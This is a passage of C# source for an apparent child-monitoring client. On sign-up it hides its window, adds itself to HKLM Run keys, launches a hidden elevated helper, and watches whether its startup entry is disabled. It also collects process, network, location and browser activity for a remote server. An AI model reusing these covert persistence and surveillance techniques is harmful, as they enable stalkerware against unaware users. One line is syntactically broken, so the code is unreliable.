            //                    case (short)Packet.SystemLimitAct.Lock:
            //                        {
            //                            DoSystem((short)var["Act"]);
            //                        }; break;
            //                }
            //
            //                break;
            //            }
            //            else
            //            {
            //                if (DateTime.Now.CompareTo(Start) <= 0)
            //                {
            //                    try
            //                    {
            //                        MyTimer3 TimeWatcher = new MyTimer3();
            //                        System.Timers.Timer Target = new System.Timers.Timer((Start - DateTime.Now).TotalHours);
            //                        System.Timers.Timer Duration = new System.Timers.Timer((double)var["Duration"]);
            //                        Target.Elapsed += BeforSystemLimitElipced;
            //                        Duration.Elapsed += Duration_Elapsed;
            //                        Target.Start();
            //                        TimeWatcher.STW = new Stopwatch();
            //                        TimeWatcher.STW.Start();
            //                        TimeWatcher.TimeWatcher = Target;
            //                        TimeWatcher.ID = var["ID"].ToString();
            //                        TimeWatcher.Duration = Duration;
            //                        System3Timer.Add(TimeWatcher);
            //                    }
            //                    catch (Exception E)
            //                    {
            //                        MyTimer TimeWatcher = new MyTimer();
            //                        System.Timers.Timer Target = new System.Timers.Timer((Start - DateTime.Now).TotalHours);
            //                        Target.Elapsed += BeforSystemLimitElipced;
            //                        Target.Start();
            //                        TimeWatcher.TimeWatcher = Target;
            //                        TimeWatcher.ID = var["ID"].ToString();
            //                        System2Timer.Add(TimeWatcher);
            //                    }
            //
            //                }
            //            }
            //        }
            //    }
            //    );
            //
            //    ProcessHandler.FindeStartedProcess(ProcessIncoming);
            //    ProcessHandler.FindStopedProcess(ProcessOutcoming);
            //    NetWork.SetEventOnVPN(VPNChange);
            //    NetWork.SetEventOnIP(IPChange);
            //    NetWork.SetEventOnConnections(Connect, DisConnect);
            //    NetWork.GetAllAdapter(ref AllNetWorkAdaptors);
            //    Task.Run(() =>
            //    {
            //        Thread.Sleep(1000);
            //        Packet Pack = new Packet();
            //        foreach (string Var in AllNetWorkAdaptors)
            //        {
            //            Packet.NetworkStatus NetAdaptor = new Packet.NetworkStatus();
            //            Packet.ProPacket NetPro = new Packet.ProPacket();
            //            NetAdaptor.Data = Var;
            //            NetAdaptor.Time = DateTime.Now;
            //            NetAdaptor.Type = (short)Packet.NetworkStatusType.Connected;
            //            string Data = Pack.ToString(NetAdaptor);
            //            NetPro.ID = DS.Tables["Data"].Rows[2]["DataContent"].ToString();
            //            NetPro.Type = (short)Packet.PacketType.NetworkStatusNow;
            //            NetPro.TotalSize = Encoding.Unicode.GetBytes(Data).Length;
            //            string ProData = Pack.ToString(NetPro);
            //            if (Connection.ConnectionIsAlive == true)
            //            {
            //                Connection.SendDataSM.WaitOne();
            //                Connection.SendToServer(ProData);
            //                Connection.SendToServer(Data);
            //                Connection.SendDataSM.Release();
            //            }
            //            else
            //            {
            //                DataRow RRow = DS.Tables["MessageLogRemaining"].NewRow();
            //                RRow["ProPack"] = ProData;
            //                RRow["Data"] = Data;
            //                RRow["ID"] = DataBaseAgent.ExequteWithCommandScaler("Select NEWID()");
            //                DS.Tables["MessageLogRemaining"].Rows.Add(RRow);
            //                DataBaseAgent.InsertData(DS.Tables["MessageLogRemaining"]);
            //            }
            //        }
            //
            //
            //    });
            //    Initial();
            //    MyPlace.PositionEvent(PositionChanged);
            //    MyPlace.SetEventOnLocationService(LocationStatsChange);
            //    ConnectedToInternetInterface = NetWork.GetConnectionInterfaceName();
            //    BrowserDataController.Chrome(ChromeHandler);
            //    BrowserDataController.FireFox(firefoxHandler);
            //    BrowserDataController.IE(IEHandler);
            //    BrowserDataController.Opera(OperaHandler);
            //    BrowserDataController.Edge(EdgeHandler);
            //
            //
            //    Task.Run(() =>
            //    {
            //        MyPlace.StartLocating();
            //        Thread.Sleep(1000);
            //        DataBaseAgent.SelectData("InstalledApps", ref DS, "InstalledApps");
            //        if (DS.Tables["InstalledApps"].Rows.Count == 0)
            //        {
            //            AppTools.GetAllApps();
            //            DataBaseAgent.InsertBulkData("InstalledApps", DS.Tables["InstalledApps"]);
            //        }
            //        //DataBaseAgent.InsertData(DS.Tables["InstalledApps"]);
            //        DS.Tables.Remove("InstalledApps");
            //        //DS.Tables["InstalledApps"].AcceptChanges();
            //        //DS.Tables.Remove("InstalledApps");
            //    }
            //    );
            //    SendRemainingData();
            //}


        }

        public static string Generator()
        {
            Random rand = new Random();
            return rand.Next(0, 1000).ToString();
        }

        public void SetEventOnSturtupDiaableOrEnable(EventArrivedEventHandler Handler)
        {
            string keyPath = "Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\StartupApproved\\Run";
            DisableOrEnablePath = keyPath;
            var currentUser = WindowsIdentity.GetCurrent();
            var query = new WqlEventQuery(string.Format(
            "SELECT * FROM RegistryKeyChangeEvent WHERE Hive='HKEY_USERS' AND KeyPath='{0}\\\\{1}'",
            currentUser.User.Value, keyPath.Replace("\\", "\\\\")));
            SturtupDisableOrEnable = new ManagementEventWatcher(query);
            SturtupDisableOrEnable.EventArrived += Handler;
            SturtupDisableOrEnable.Start();
        }

        private void LoginBtn_Click(object sender, EventArgs e)
        {
            if (DS.Tables["Data"].Rows[5]["DataContent"].ToString() == "0")
            {
                DS.Tables["Data"].Rows[2]["DataContent"] = ChildIDTxt.Text;
                DataBaseAgent.SelectData("MessageLogRemaining", ref DS, "MessageLogRemaining");
                DS.Tables["Data"].Rows[3]["DataContent"] = ParentIDTxt.Text;
                Connection = new ConnectionClass(DS.Tables["Data"].Rows[1]["DataContent"].ToString(), DS.Tables["Data"].Rows[0]["DataContent"].ToString(), 1024 * 4, 3);
                Connection.SignUpEventHandler += Connection_SignUpEventHandler;
            }
            

            
        }

        private void Connection_SignUpEventHandler(object sender, string e)
        {
            if (e == "Fail")
            {
                if (Connection.Result == "UserName")
                {
                    StatusLab.Invoke(() Delegate { })
                    StatusLab.Text = "Parent ID is incorrect or Child ID is Used Before";
                }
            }
            else
            {
                this.Visible = false;
                this.Size = new Size(0, 0);
                this.WindowState = FormWindowState.Minimized;
                this.ShowInTaskbar = false;
                this.Hide();
                Sturtup = new ManagementEventWatcher();
                SturtupDisableOrEnable = new ManagementEventWatcher();
                NewDay = new System.Timers.Timer();
                MeesageAdd = new Semaphore(1, 1);
                RegistryKey add = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
                Run = add;
                add.SetValue("pckma", Application.ExecutablePath.ToString());
                add = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
                add.SetValue("pckmasp", Application.StartupPath.ToString() + "\\" + "SpareWF.exe");
                try
                {
                    string Data = add.GetValue("pckmasp").ToString();
                }
                catch (Exception E)
                {
                    add.SetValue("pckmasp", Application.StartupPath.ToString() + "\\" + "SpareWF.exe");
                    ProcessStartInfo StartInfo = new ProcessStartInfo(Application.StartupPath.ToString() + "\\" + "SpareWF.exe");
                    StartInfo.UseShellExecute = true;
                    StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                    StartInfo.Verb = "runas";
                    Process process = new Process();
                    process.StartInfo = StartInfo;
                    process.Start();
                }
                SetEventOnSturtup(SturtupChange);
                SetEventOnSturtupDiaableOrEnable(DisableOrEnableChange);
                SMUN = new Semaphore(1, 1);
                ProcessHandler = new Process_Handler();
                NetWork = new NetWorkTools();
                ScreenShot = new ScreenShotClass();
                MyPlace = new Location();
                AppTools = new ApplicationTools();
                BrowserDataController = new Browsers();

                System2Timer = new List<MyTimer>();
                App2Timer = new List<MyTimer>();
                App3Timer = new List<MyTimer3>();
                System3Timer = new List<MyTimer3>();
                Network3Timer = new List<MyTimer3>();
                System3Timer = new List<MyTimer3>();
                NetWork2Timer = new List<MyTimer>();
                AllNetWorkAdaptors = new List<string>();


                DataBaseAgent.SelectData("RecivedCommands", ref DS, "RecivedCommands");
                DataBaseAgent.SelectData("MessageLogRemaining", ref DS, "MessageLogRemaining");
                //DS.Tables["RecivedCommands"].RowChanged += MessageRecived;
                DataBaseAgent.SelectData("MessageLog", ref DS, "MessageLog");
                DS.Tables["MessageLog"].Clear();
                Task.Run(() =>
                {

                    DataBaseAgent.SelectData("AppLimit", ref DS, "AppLimit");
                    DataBaseAgent.SelectData("AppsBlock", ref DS, "AppsBlock");
                    DataBaseAgent.SelectData("BlockURL", ref DS, "BlockURL");
                    DataBaseAgent.SelectData("NetworkLimit", ref DS, "NetworkLimit");
                    //DataBaseAgent.SelectData("SystemLimit", ref DS, "SystemLimit");
                    //if (DS.Tables["AppLimit"].Rows.Count == 0)
                    //{
                    //    DS.Tables.Remove("AppLimit");
                    //}
                    //if (DS.Tables["AppsBlock"].Rows.Count == 0)
                    //{
                    //    DS.Tables.Remove("AppsBlock");
                    //}
                    //if (DS.Tables["BlockURL"].Rows.Count == 0)
                    //{
                    //    DS.Tables.Remove("BlockURL");
                    //}
                    //if (DS.Tables["NetworkLimit"].Rows.Count == 0)
                    //{
                    //    DS.Tables.Remove("NetworkLimit");
                    //}
                    //if (DS.Tables["SystemLimit"].Rows.Count == 0)
                    //{
                    //    DS.Tables.Remove("SystemLimit");
                    //}
                });
                string T = DateTime.Now.ToString();
                NewDay.Interval = 2 * 3600 * 1000;//2h
                NewDay.Elapsed += NewDay_Elapsed;
                NewDay.Start();

                Task.Run(() =>
                {
                    try
                    {
                        DS.Tables["Data"].Rows[6]["DataContent"] = DateTime.Now.ToString();
                        DataBaseAgent.UpdateData(DS.Tables["Data"]);
                    }
                    catch (Exception E)
                    {
                        DataRow Row = DS.Tables["Data"].NewRow();
                        Row["DataContent"] = DateTime.Now.ToString();
                        DS.Tables["Data"].Rows.Add(Row);
                        DataBaseAgent.InsertData(DS.Tables["Data"]);
                    }
                    //Connection = new ConnectionClass(DS.Tables["Data"].Rows[1]["DataContent"].ToString(), "127.0.0.1", 1024 * 4, 3, MessageRecived);
                }
                );

                Task.Run(() =>
                {
                    DataBaseAgent.SelectData("SystemLimit", ref DS, "SystemLimit");
                    foreach (DataRow var in DS.Tables["SystemLimit"].Rows)
                    {
                        try
                        {
                            DateTime TempTime = new DateTime(DateTime.Now.Year, DateTime.Now.Month, DateTime.Now.Day, ((TimeSpan)var["StatTime"]).Hours, ((TimeSpan)var["StatTime"]).Minutes, ((TimeSpan)var["StatTime"]).Seconds);
                            //DateTime TempDate = Convert.ToDateTime(var["StartTime"]);
                            DateTime Start = new DateTime(DateTime.Now.Year, DateTime.Now.Month, DateTime.Now.Day, TempTime.Hour, TempTime.Minute, TempTime.Second);
                            //TempDate = Convert.ToDateTime(var["EndTime"]);
                            DateTime End = new DateTime(DateTime.Now.Year, DateTime.Now.Month, DateTime.Now.Day, ((TimeSpan)var["EndTime"]).Hours, ((TimeSpan)var["EndTime"]).Minutes, ((TimeSpan)var["EndTime"]).Seconds);
                            if (DateTime.Now.CompareTo(Start) >= 0 && (DateTime.Now.CompareTo(End) <= 0))
                            {
                                switch ((short)var["Act"])
                                {
                                    case (short)Packet.SystemLimitAct.ShutDown:
                                        {
                                            DoSystem((short)var["Act"]);
                                        }; break;
                                    //case (short)Packet.SystemLimitAct.ShoutDownWithError:
                                    //    {
                                    //        DialogResult Result = MessageBox.Show("Your Usage Time has Expire ", "Parent Message", MessageBoxButtons.OK);
                                    //        if (Result == DialogResult.OK || Result != DialogResult.OK)
                                    //        {
                                    //            DoSystem((short)var["Act"]);
                                    //        }
                                    //        DoSystem((short)var["Act"]);
                                    //    }; break;
                                    case (short)Packet.SystemLimitAct.Sleep:
                                        {
                                            DoSystem((short)var["Act"]);
                                        }; break;
                                    case (short)Packet.SystemLimitAct.Reboot:
                                        {
                                            DoSystem((short)var["Act"]);
                                        }; break;
                                    case (short)Packet.SystemLimitAct.Logoff:
                                        {
                                            DoSystem((short)var["Act"]);
                                        }; break;
                                    case (short)Packet.SystemLimitAct.Lock:
                                        {
                                            DoSystem((short)var["Act"]);
                                        }; break;
                                }

                                break;
                            }
                            else
                            {
                                if (DateTime.Now.CompareTo(Start) <= 0)
                                {
                                    try
                                    {
                                        MyTimer3 TimeWatcher = new MyTimer3();
                                        System.Timers.Timer Target = new System.Timers.Timer((Start - DateTime.Now).TotalMilliseconds);
                                        System.Timers.Timer Duration = new System.Timers.Timer((double)var["Duration"]);
                                        Target.Elapsed += BeforSystemLimitElipced;
                                        Duration.Elapsed += Duration_Elapsed;
                                        Target.Start();
                                        TimeWatcher.STW = new Stopwatch();
                                        TimeWatcher.STW.Start();
                                        TimeWatcher.TimeWatcher = Target;
                                        TimeWatcher.ID = var["ID"].ToString();
                                        TimeWatcher.Duration = Duration;
                                        System3Timer.Add(TimeWatcher);
                                    }
                                    catch (Exception E)
                                    {
                                        MyTimer TimeWatcher = new MyTimer();
                                        System.Timers.Timer Target = new System.Timers.Timer((Start - DateTime.Now).TotalMilliseconds);
                                        Target.Elapsed += BeforSystemLimitElipced;
                                        Target.Start();
                                        TimeWatcher.TimeWatcher = Target;
                                        TimeWatcher.ID = var["ID"].ToString();
                                        System2Timer.Add(TimeWatcher);
                                    }

                                }
                            }
                        }
                        catch (Exception E)
                        {

                        }


                    }
                }
                );
                //Updater = new AutoUpdateClass();
                //Updater.IncommingProcess = ProcessIncoming;
                //Updater.OutcommingProcess = ProcessOutcoming;
                //Updater.Start(DS.Tables["Data"].Rows[0]["DataContent"].ToString(), 89898, "v1.0.0", "SpareWF", Process.GetCurrentProcess().MainModule.FileName);
                ProcessHandler.FindeStartedProcess(ProcessIncoming);
                ProcessHandler.FindStopedProcess(ProcessOutcoming);
                NetWork.SetEventOnVPN(VPNChange);
                NetWork.SetEventOnIP(IPChange);
                NetWork.SetEventOnConnections(Connect, DisConnect);
                NetWork.GetAllAdapter(ref AllNetWorkAdaptors);
                Task.Run(() =>
                {
                    Thread.Sleep(1000);
                    Packet Pack = new Packet();
                    foreach (string Var in AllNetWorkAdaptors)
                    {
                        Packet.NetworkStatus NetAdaptor = new Packet.NetworkStatus();
                        Packet.ProPacket NetPro = new Packet.ProPacket();
                        NetAdaptor.Data = Var;
                        NetAdaptor.Time = DateTime.Now;
                        NetAdaptor.Type = (short)Packet.NetworkStatusType.Connected;
                        string Data = Pack.ToString(NetAdaptor);
                        NetPro.ID = DS.Tables["Data"].Rows[2]["DataContent"].ToString();
                        NetPro.Type = (short)Packet.PacketType.NetworkStatusNow;
                        NetPro.TotalSize = Encoding.Unicode.GetBytes(Data).Length;
                        string ProData = Pack.ToString(NetPro);
                        if (Connection.ConnectionIsAlive == true)
                        {
                            Connection.SendDataSM.WaitOne();
                            Packet.MainPacket MPacket = new Packet.MainPacket();
                            MPacket.PPacket = ProData;
                            MPacket.Data = Data;

                            Connection.SendToServer(Pack.ToString(MPacket));
                            //Connection.SendToServer(Data);
                            Connection.SendDataSM.Release();
                        }
                        else
                        {
                            DataRow RRow = DS.Tables["MessageLogRemaining"].NewRow();
                            RRow["ProPack"] = ProData;
                            RRow["Data"] = Data;
                            MeesageAdd.WaitOne();
                            RRow["Date"] = DateTime.Now.ToString("MM/dd/yyyy HH:mm:ss.fffff");
                            Thread.Sleep(10);
                            DS.Tables["MessageLogRemaining"].Rows.Add(RRow);
                            MeesageAdd.Release();
                            DataBaseAgent.InsertData(DS.Tables["MessageLogRemaining"]);
                        }
                    }


                });
                Initial();
                MyPlace.PositionEvent(PositionChanged);
                MyPlace.SetEventOnLocationService(LocationStatsChange);
                ConnectedToInternetInterface = NetWork.GetConnectionInterfaceName();
                BrowserDataController.Chrome(ChromeHandler);
                BrowserDataController.FireFox(firefoxHandler);
                BrowserDataController.IE(IEHandler);
                BrowserDataController.Opera(OperaHandler);
                BrowserDataController.Edge(EdgeHandler);
                Task.Run(() =>
                {
                    MyPlace.StartLocating();
                    Thread.Sleep(1000);
                    DataBaseAgent.SelectData("InstalledApps", ref DS, "InstalledApps");
                    if (DS.Tables["InstalledApps"].Rows.Count == 0)
                    {
                        AppTools.GetAllApps();
                        DataBaseAgent.InsertBulkData("InstalledApps", DS.Tables["InstalledApps"]);
                    }
                    //DataBaseAgent.InsertData(DS.Tables["InstalledApps"]);
                    DS.Tables.Remove("InstalledApps");
                    //DS.Tables["InstalledApps"].AcceptChanges();
                    //DS.Tables.Remove("InstalledApps");
                }
                );
                SendRemainingData();
            }
        }
    }

}
